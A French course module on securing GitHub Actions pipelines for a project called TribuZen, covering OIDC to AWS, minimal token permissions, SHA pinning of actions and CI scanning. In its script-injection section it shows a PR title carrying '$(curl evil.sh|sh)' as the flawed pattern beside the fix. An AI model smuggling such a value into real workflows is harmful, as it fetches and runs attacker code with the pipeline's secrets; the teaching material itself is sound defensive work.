---
titre: Sécurité des pipelines (OIDC, least privilege, action pinning, scanning)
cours: 15-cicd-devops
notions: ["OIDC vers le cloud (id-token write)", "sub claim (repo:org/repo:environment)", "aws-actions/configure-aws-credentials@v6", "secrets GitHub (repo / org / environment)", "permissions du GITHUB_TOKEN", "least privilege (permissions read-only par défaut)", "permissions vide pour tout refuser", "action pinning au SHA full-length", "supply chain (tj-actions/changed-files 2025)", "SAST CodeQL", "dependency review + dependabot.yml", "secret scanning + push protection", "script injection via env"]
outcomes:
  - sait remplacer des clés cloud long terme par une authentification OIDC sans secret
  - sait ranger un secret au bon niveau (repo / organisation / environment) et restreindre le GITHUB_TOKEN au strict nécessaire
  - sait épingler les actions à un SHA complet pour se protéger d'une attaque supply chain
  - sait brancher SAST, dependency review et secret scanning dans un pipeline
  - connaît les pièges de sécurité les plus courants d'un workflow (injection, permissions par défaut, tag mutable)
prerequis: [notions des modules 00-07 (CI vs CD, workflow/jobs/steps/events, matrix/cache/artefacts/environments, tests en CI, Docker en CI, registries, stratégies de déploiement, preview environments)]
next: 09-iac-introduction
libs: []
tribuzen: pipeline CI/CD de TribuZen — durcir le workflow de déploiement (deploy.yml) — OIDC vers AWS, GITHUB_TOKEN minimal, actions épinglées au SHA, scanning en CI
last-reviewed: 2026-07
---

# Sécurité des pipelines

> **Outcomes — tu sauras FAIRE :** remplacer des clés cloud long terme par de l'OIDC sans secret, restreindre le `GITHUB_TOKEN` au strict nécessaire, épingler les actions au SHA, et brancher SAST / dependency review / secret scanning dans un pipeline.
> **Difficulté :** :star::star::star::star:
>
> **Portée :** ce module sécurise le **pipeline lui-même** (comment il s'authentifie, ce qu'il a le droit de faire, ce qu'il exécute). La sécurité **applicative** en profondeur (auth utilisateur, OWASP, validation d'entrées du produit) est le **cours 14**. La configuration **IAM côté AWS** (créer le rôle, écrire la trust policy, les conditions) est le **cours 12** — ici on consomme un rôle déjà provisionné. Les **environments** et leurs approvals ont été vus au **module 02** ; on les réutilise comme frontière de secrets.

## 1. Cas concret d'abord

Tu reprends le pipeline de déploiement de TribuZen. Le `deploy.yml` actuel « marche » — et c'est exactement le problème. Voici son état, avec les trois failles qui font qu'un audit sécurité le recalerait immédiatement :

```yaml
# .github/workflows/deploy.yml — état DANGEREUX (à auditer)
name: Deploy
on:
  push:
    branches: [main]

# ❌ FAILLE 1 : aucun bloc permissions → le GITHUB_TOKEN hérite du défaut du repo,
#    potentiellement write-all (repos anciens). Une action compromise pourrait
#    pousser du code, créer des releases, ouvrir des PR en ton nom.

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7                      # ❌ FAILLE 2 : tag mutable
      - uses: tj-actions/changed-files@v44             # ❌ FAILLE 2 : tag mutable
      - name: Deploy to AWS
        env:
          # ❌ FAILLE 3 : clés IAM long terme stockées en secret, jamais expirées
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: ./scripts/deploy.sh
```

Ces failles ne sont pas théoriques. En **mars 2025**, l'action `tj-actions/changed-files` — utilisée par ~23 000 dépôts — a été compromise : un attaquant a **réécrit tous les tags de version** (`v44`, `v43`…) pour pointer vers un commit malveillant qui exfiltrait les secrets de chaque run. Tout workflow épinglé sur un **tag** (mutable) a exécuté le code piégé ; ceux épinglés sur un **SHA** (immuable) ont été épargnés.

**Trois durcissements, tous couverts dans ce module :**

1. Clés IAM long terme → **OIDC** : le job échange un jeton GitHub éphémère contre des credentials AWS temporaires. Plus aucun secret cloud stocké (§2.1).
2. Pas de `permissions` → **least privilege** : on déclare explicitement ce que le `GITHUB_TOKEN` a le droit de faire, tout le reste est refusé (§2.3).
3. Tags mutables → **action pinning au SHA** : on épingle chaque action à un commit exact, immuable (§2.5).

À la fin du module, `deploy.yml` s'authentifie sans secret, avec un token quasi muet, sur des actions figées, et un scan de sécurité tourne à chaque PR.

---

## 2. Théorie complète, concise

### 2.1 OIDC — s'authentifier au cloud sans secret long terme

Le problème des clés IAM stockées en secret : elles **n'expirent jamais**. Fuitées (log, action compromise, dump), elles restent valides jusqu'à rotation manuelle. L'**OIDC** (OpenID Connect) supprime le secret : GitHub émet, **pour chaque job**, un JWT signé décrivant l'identité du workflow ; le cloud vérifie ce jeton et rend des credentials **temporaires** (quelques minutes).

Le workflow doit demander ce jeton. Cela exige la permission `id-token: write` :

```yaml
permissions:
  id-token: write        # autorise le job à demander le JWT OIDC à GitHub
  contents: read         # tout le reste reste au minimum
```

Côté AWS, on consomme un **rôle** déjà provisionné (la trust policy et l'IAM sont le cours 12). L'action officielle :

```yaml
steps:
  - name: Configure AWS credentials (OIDC)
    uses: aws-actions/configure-aws-credentials@v6      # v6 = version courante
    with:
      role-to-assume: arn:aws:iam::123456789012:role/tribuzen-deploy
      aws-region: eu-west-3
      role-session-name: tribuzen-deploy               # nom lisible dans CloudTrail
      # AUCUNE access key / secret key — c'est tout l'intérêt
```

Le cloud décide **à qui** il fait confiance grâce au **`sub` claim** du JWT, qui encode l'origine du run. Format typique :

```
repo:smaurier/tribuzen:environment:production
repo:smaurier/tribuzen:ref:refs/heads/main
repo:smaurier/tribuzen:pull_request
```

La trust policy AWS peut ainsi n'autoriser le rôle que depuis la branche `main` **ou** l'environment `production` de **ton** repo — pas depuis un fork, pas depuis une PR. C'est là que se joue le vrai périmètre : côté cloud, sur le `sub`. (Le détail de cette condition = cours 12.)

### 2.2 Gestion des secrets — le bon niveau, la bonne frontière

Quand un secret reste nécessaire (token d'un SaaS tiers sans OIDC, clé de signature…), GitHub le range à **trois niveaux**, du plus large au plus étroit :

| Niveau | Portée | Exemple TribuZen |
|---|---|---|
| **Organisation** | plusieurs repos de l'org (liste blanche) | token npm partagé |
| **Repository** | tous les workflows du repo | token d'un service commun |
| **Environment** | seuls les jobs ciblant cet environment | `DEPLOY_TOKEN` de `production` |

Le niveau **environment** est le plus puissant en sécurité : couplé aux **required reviewers** (module 02), le secret n'est **débloqué qu'après approbation humaine**. Un job qui ne cible pas `production` ne voit jamais son `DEPLOY_TOKEN`.

Règles de survie :

- On lit un secret **uniquement** via le contexte `secrets` dans un bloc de code : `secrets.DEPLOY_TOKEN`. Jamais en dur dans le YAML.
- GitHub **masque** les secrets dans les logs (remplacés par `***`), mais un `echo` d'un secret transformé (base64, découpé) peut fuiter. Ne les affiche jamais.
- Un secret n'est **pas** passé aux workflows déclenchés depuis un fork (`pull_request` d'un contributeur externe) — sécurité by design.

### 2.3 Least privilege — restreindre le `GITHUB_TOKEN`

Chaque run reçoit un `GITHUB_TOKEN` automatique pour agir sur le repo (push, commenter une PR, publier un package…). Le bloc `permissions` fixe ce qu'il a le droit de faire, **scope par scope**. Depuis février 2023, les nouvelles organisations ont un défaut **read-only** — mais on ne parie pas dessus, on **déclare** :

```yaml
# Niveau workflow : plancher pour tous les jobs
permissions:
  contents: read           # cloner le repo, rien de plus

jobs:
  release:
    permissions:           # override AU NIVEAU JOB : seul ce job élève ses droits
      contents: write      # créer un tag / une release
      packages: write      # pousser une image dans GHCR
    runs-on: ubuntu-latest
    steps: [...]
```

Principe : **déclarer le minimum au niveau workflow, élever ponctuellement au niveau job**. Un `permissions` de job **remplace** (ne fusionne pas) celui du workflow : les scopes non listés retombent à `none`.

Scopes fréquents : `contents`, `packages`, `pull-requests`, `issues`, `id-token` (OIDC), `security-events` (remontée SAST), `actions`, `deployments`. Chacun vaut `read`, `write` ou `none`.

Pour un job qui ne fait qu'exécuter du code sans toucher au repo, le plus sûr est de **tout couper** :

```yaml
permissions: {}            # aucun scope : le GITHUB_TOKEN ne peut rien faire sur le repo
```

### 2.4 Scanning en CI — SAST, dépendances, secrets

Trois familles de scan, complémentaires, à brancher dans la CI :

**SAST (Static Application Security Testing)** — analyse le code source à la recherche de vulnérabilités (injection SQL, XSS, etc.). Sur GitHub : **CodeQL**. Il a besoin d'écrire ses résultats :

```yaml
jobs:
  codeql:
    permissions:
      contents: read
      security-events: write        # requis : CodeQL remonte les alertes dans l'onglet Security
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: github/codeql-action/init@v3
        with:
          languages: javascript-typescript
      - uses: github/codeql-action/analyze@v3
```

**Dependency scanning (SCA)** — vérifie les dépendances vulnérables. Deux outils :
- **Dependency review** sur les PR — bloque une PR qui **introduit** une dépendance vulnérable :

```yaml
  dependency-review:
    permissions:
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
```

- **Dependabot** — ouvre automatiquement des PR de mise à jour. Il se configure par un fichier, **pas** dans un workflow :

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: weekly
  - package-ecosystem: github-actions      # met aussi à jour les SHA épinglés (§2.5)
    directory: "/"
    schedule:
      interval: weekly
```

**Secret scanning + push protection** — détecte les secrets (clés API, tokens) commités. La **push protection** va plus loin : elle **bloque le `git push`** avant que le secret n'entre dans l'historique. Ça s'active dans les réglages du repo (Settings → Code security), pas dans le YAML. C'est ce garde-fou qui refuse un `AKIA...` ou un `sk_live_...` poussé par erreur.

### 2.5 Action pinning — épingler au SHA complet

Une action référencée par **tag** (`@v7`) ou **branche** (`@main`) est une cible mouvante : quiconque a les droits d'écriture sur le repo de l'action peut **réécrire** ce tag vers un commit malveillant. C'est exactement l'attaque `tj-actions/changed-files` de mars 2025 (§1).

La seule référence **immuable** est le **SHA de commit complet** (40 caractères) — falsifier un SHA exigerait une collision SHA-1, hors de portée pratique :

```yaml
# ❌ mutable : le tag v7 peut être déplacé vers du code piégé
- uses: actions/checkout@v7

# ✅ immuable : SHA complet, avec le tag en commentaire pour la lisibilité
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.0
```

Le commentaire `# v4.2.2` garde la référence lisible **et** permet à Dependabot (`package-ecosystem: github-actions`, §2.4) de proposer des bumps : il met à jour le SHA **et** le commentaire. On garde donc l'immuabilité sans figer indéfiniment une version vulnérable.

Priorité pragmatique : on épingle **au moins les actions tierces** (le plus gros risque). Beaucoup d'équipes épinglent aussi les actions officielles `actions/*` par cohérence de politique.

### 2.6 Supply chain du pipeline — la surface d'attaque

Un pipeline exécute du code tiers (chaque `uses:`) avec accès aux secrets et au réseau. Sa **supply chain**, c'est l'ensemble de ce code de confiance. Les vecteurs à connaître :

- **Action tierce compromise** → mitigé par le **pinning SHA** (§2.5) et par une **allowlist** d'actions autorisées (réglage org/repo).
- **Script injection** — injecter une donnée contrôlée par l'attaquant (titre de PR, nom de branche) directement dans un `run:` :

```yaml
# ❌ le titre de PR est interpolé dans le shell → un titre "$(curl evil.sh|sh)" s'exécute
- run: echo "PR: ${{ github.event.pull_request.title }}"

# ✅ passer par une variable d'environnement : le shell ne réévalue pas son contenu
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR: $PR_TITLE"
```

- **Trigger dangereux** — `pull_request_target` s'exécute avec les secrets du repo cible dans le contexte d'une PR externe : à manier avec une extrême prudence (préférer `pull_request`, sans secrets, pour du code non fiable).

La règle générale : **toute donnée venant de l'extérieur est hostile**, tout code tiers est figé, tout droit est minimal.

---

## 3. Worked examples

### Exemple 1 — `deploy.yml` : des clés long terme à l'OIDC

On corrige la **FAILLE 3** du §1. Avant : deux secrets IAM éternels. Après : rien de stocké, credentials temporaires.

```yaml
# .github/workflows/deploy.yml — déploiement OIDC
name: Deploy
on:
  push:
    branches: [main]

# Plancher minimal pour tout le workflow
permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production                    # frontière : approval + secrets dédiés (module 02)
      url: https://app.tribuzen.fr
    permissions:
      id-token: write                     # requis pour demander le JWT OIDC
      contents: read                      # cloner le repo
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.0

      - name: Configure AWS credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@b47578312673ae6fa5b5096b330d9fbac3d116df # v6.2.1
        with:
          role-to-assume: arn:aws:iam::123456789012:role/tribuzen-deploy
          aws-region: eu-west-3
          role-session-name: tribuzen-deploy

      - name: Deploy
        run: ./scripts/deploy.sh          # les credentials temporaires sont dans l'environnement
```

**Pourquoi c'est correct :**
- Plus **aucun** `AWS_ACCESS_KEY_ID` stocké. GitHub émet un JWT, AWS le vérifie via le `sub` claim (`repo:smaurier/tribuzen:environment:production`) et rend des credentials qui expirent en minutes.
- `id-token: write` est **au niveau job**, pas workflow : seul ce job peut demander un jeton OIDC.
- L'`environment: production` ajoute l'approbation humaine **et** cadre le `sub` claim (la trust policy AWS n'autorise que cet environment).
- Les deux actions sont épinglées au **SHA**, tag en commentaire.

### Exemple 2 — un workflow de sécurité en PR (scanning + permissions minimales)

Un `security.yml` qui tourne sur chaque PR : SAST, dependency review, permissions au plus juste, actions épinglées.

```yaml
# .github/workflows/security.yml
name: Security
on:
  pull_request:

# Plancher : lecture seule pour tous les jobs
permissions:
  contents: read

jobs:
  codeql:
    permissions:
      contents: read
      security-events: write              # override : CodeQL a besoin d'écrire ses alertes
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.0
      - uses: github/codeql-action/init@4e828ff8d448a8a6e532957b1811f387a63867e8 # v3.28.1
        with:
          languages: javascript-typescript
      - uses: github/codeql-action/analyze@4e828ff8d448a8a6e532957b1811f387a63867e8 # v3.28.1

  dependency-review:
    permissions:
      contents: read                      # hérite du plancher, sans security-events
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.0
      - uses: actions/dependency-review-action@3b139cfc5fae8b618d3eae3675e383bb1769c019 # v4.5.0
        with:
          fail-on-severity: high          # bloque la PR si une dépendance high+ est introduite
```

**Pourquoi c'est correct :**
- Chaque job **déclare** ses permissions ; `dependency-review` n'a **pas** `security-events` (il n'en a pas besoin) — least privilege par job.
- CodeQL fait du **SAST**, dependency-review de la **SCA** : deux angles complémentaires.
- Toutes les actions sont épinglées au SHA ; Dependabot (`github-actions`) proposera les bumps.
- Sur une PR de fork, le `GITHUB_TOKEN` reste read-only et sans secret — ces scans ne dépendent d'aucun secret, ils tournent donc en toute sécurité.

---

## 4. Pièges & misconceptions

### PIÈGE #1 — Croire que « OIDC » se configure seulement dans le YAML

Le YAML (`id-token: write` + `configure-aws-credentials`) n'est que la **moitié**. Sans la **trust policy** côté AWS qui autorise le `sub` claim de ton repo, l'échange échoue. Inversement, une trust policy trop large (`repo:org/*:*`) laisse **n'importe quelle** branche ou PR assumer le rôle. Le vrai périmètre se règle côté cloud (cours 12) — le YAML seul ne sécurise rien.

### PIÈGE #2 — Épingler à un tag en croyant que c'est immuable

`@v7` **n'est pas** une version figée : c'est un tag Git, déplaçable par le mainteneur (ou un attaquant qui a compromis le repo). Seul le **SHA complet** est immuable. `@v7.0.0` non plus n'est pas garanti immuable — un tag reste un tag. C'est précisément ce qui a rendu l'attaque `tj-actions` possible.

### PIÈGE #3 — Oublier le bloc `permissions` en pensant « le défaut est read-only »

Le défaut read-only ne vaut que pour les **orgs créées après février 2023** et **peut être rebasculé** en write-all dans les réglages. Un repo ancien ou mal configuré donne un `GITHUB_TOKEN` write-all à chaque action. On **déclare toujours** `permissions:` explicitement — on ne parie pas sur le défaut.

### PIÈGE #4 — Interpoler une donnée externe directement dans un `run:`

<code v-pre>${{ github.event.pull_request.title }}</code> (ou `head_ref`, etc.) collé dans un `run:` est **exécuté par le shell**. Un titre de PR malveillant devient une commande. Correct : passer la valeur par une variable d'**environnement** (`env:`), que le shell ne réévalue pas. C'est du script injection, l'équivalent CI d'une injection SQL.

### PIÈGE #5 — Confondre least privilege au niveau workflow et au niveau job

Un `permissions:` défini **au niveau job remplace** celui du workflow — il ne s'y ajoute pas. Si tu mets `contents: read` au workflow et `packages: write` au job, ce job **perd** `contents` (retombé à `none`). Il faut **relister** tous les scopes voulus dans le bloc du job.

### PIÈGE #6 — Croire que masquer un secret dans les logs suffit

GitHub remplace un secret par `***` dans les logs, mais **pas** ses dérivés : un secret encodé en base64, découpé, ou passé à un outil verbeux peut réapparaître en clair. Le masquage est un filet, pas une garantie. On ne fait **jamais** transiter un secret par un `echo` ou un artefact.

### PIÈGE #7 — Vouloir tout scanner ici et durcir l'appli dans ce module

La sécurité du **pipeline** (ce module) n'est pas la sécurité de l'**application** (cours 14). CodeQL et dependency review branchés en CI sont des **portes** du pipeline ; l'analyse fine des vulnérabilités applicatives, le threat modeling et la remédiation sont le cours 14. De même, écrire la trust policy IAM est le cours 12. On câble les outils, on ne refait pas ces cours ici.

---

## 5. Ancrage TribuZen

Le fil-rouge du cours est le **pipeline CI/CD de TribuZen**. Ce module en durcit la partie sensible : le déploiement et la chaîne d'exécution.

- **`.github/workflows/deploy.yml`** — passe de deux clés IAM long terme à l'**OIDC** vers AWS (Exemple 1), `id-token: write` au niveau job, actions épinglées au SHA, derrière l'environment `production` et son approbation.
- **`.github/workflows/security.yml`** — **CodeQL** (SAST) + **dependency review** (SCA) sur chaque PR, permissions minimales par job (Exemple 2).
- **`.github/dependabot.yml`** — mises à jour hebdomadaires des dépendances npm **et** des actions (bump des SHA épinglés).
- **Réglages repo** (hors YAML) — **secret scanning + push protection** activés ; défaut `GITHUB_TOKEN` en read-only.

Fichiers cibles dans `smaurier/tribuzen` :

```
tribuzen/
  .github/
    workflows/
      deploy.yml          ← Exemple 1 (OIDC, permissions job, pinning SHA)
      security.yml        ← Exemple 2 (CodeQL + dependency review)
    dependabot.yml        ← npm + github-actions
```

> La **trust policy IAM** qui autorise le `sub` claim de TribuZen se provisionne au **cours 12** ; la sécurité **applicative** (auth, OWASP) au **cours 14**. Ici, on sécurise le tuyau, pas ce qui coule dedans.

---

## 6. Points clés

1. **OIDC** supprime les clés cloud long terme : `id-token: write` + `configure-aws-credentials@v6` échangent un JWT éphémère contre des credentials temporaires. Aucun secret cloud stocké.
2. Le **`sub` claim** (`repo:org/repo:environment:production`) est ce que le cloud vérifie — le vrai périmètre se règle dans la trust policy (cours 12), pas dans le YAML.
3. Les **secrets** se rangent au niveau org / repo / **environment** ; le niveau environment + required reviewers ne débloque le secret qu'après approbation humaine.
4. **Least privilege** : déclarer `permissions:` explicitement, minimal au niveau workflow, élevé ponctuellement au niveau job (qui **remplace**, ne fusionne pas). `permissions: {}` coupe tout.
5. **Action pinning au SHA complet** = seule référence immuable ; un tag est déplaçable (attaque `tj-actions/changed-files`, mars 2025). Tag en commentaire + Dependabot pour les bumps.
6. **Scanning** : CodeQL (SAST, `security-events: write`), dependency review + Dependabot (SCA), secret scanning + push protection (réglage repo).
7. **Script injection** : ne jamais interpoler une donnée externe dans un `run:` — passer par `env:`.
8. Portée : sécurité du **pipeline** ici ; IAM AWS → cours 12 ; sécurité **applicative** → cours 14.

---

## 7. Seeds Anki

```
Que remplace l'OIDC dans un workflow de déploiement cloud ?|Les credentials cloud long terme stockés en secret (ex. clés IAM AWS). GitHub émet un JWT éphémère par job ; le cloud le vérifie et rend des credentials temporaires. Rien de permanent n'est stocké.
Quelle permission un job doit-il avoir pour utiliser l'OIDC ?|id-token: write (dans le bloc permissions du job). Elle autorise le job à demander le JWT OIDC à GitHub. Sans elle, configure-aws-credentials échoue.
Que vérifie le cloud pour décider s'il fait confiance à un run OIDC ?|Le sub claim du JWT, qui encode l'origine (ex. repo:smaurier/tribuzen:environment:production). La trust policy côté cloud (cours 12) restreint quels repos/branches/environments peuvent assumer le rôle.
Pourquoi épingler une action à un SHA plutôt qu'à un tag @v7 ?|Un tag est mutable : le mainteneur (ou un attaquant ayant compromis le repo) peut le déplacer vers un commit malveillant. Seul le SHA complet est immuable. Cf. attaque tj-actions/changed-files, mars 2025.
Que fait permissions: {} dans un workflow ?|Coupe tous les scopes du GITHUB_TOKEN : il ne peut plus rien faire sur le repo. C'est le plancher least privilege pour un job qui n'a pas besoin d'agir sur le dépôt.
Un permissions au niveau job fusionne-t-il avec celui du workflow ?|Non, il le remplace. Les scopes non relistés dans le bloc du job retombent à none. Il faut relister tous les scopes voulus.
Comment se protéger d'une script injection type ${{ github.event.pull_request.title }} dans un run ?|Ne pas interpoler la donnée externe dans le run (le shell l'exécuterait). La passer par une variable d'environnement (env:) que le shell ne réévalue pas.
CodeQL vs dependency review : quel type de scan chacun ?|CodeQL = SAST (analyse statique du code source pour des vulnérabilités). dependency review = SCA (dépendances vulnérables introduites par une PR). CodeQL exige security-events: write.
À quoi sert la push protection du secret scanning ?|Bloquer le git push AVANT qu'un secret (clé API, token) n'entre dans l'historique du repo. Ça s'active dans les réglages du repo, pas dans le YAML.
Où se règle le vrai périmètre d'un déploiement OIDC : YAML ou cloud ?|Côté cloud, dans la trust policy qui filtre le sub claim (cours 12). Le YAML (id-token: write + configure-aws-credentials) ne fait que demander le jeton ; une trust policy trop large laisserait n'importe quelle PR assumer le rôle.
```

---

## Pont vers le lab

> Lab associé : `labs/lab-08-securite-pipelines/README.md`. Auditer et durcir un `deploy.yml` TribuZen volontairement vulnérable — OIDC, permissions minimales, pinning SHA, scanning — sur un vrai dépôt GitHub. Corrigé YAML commenté intégral, feedback coach en session.
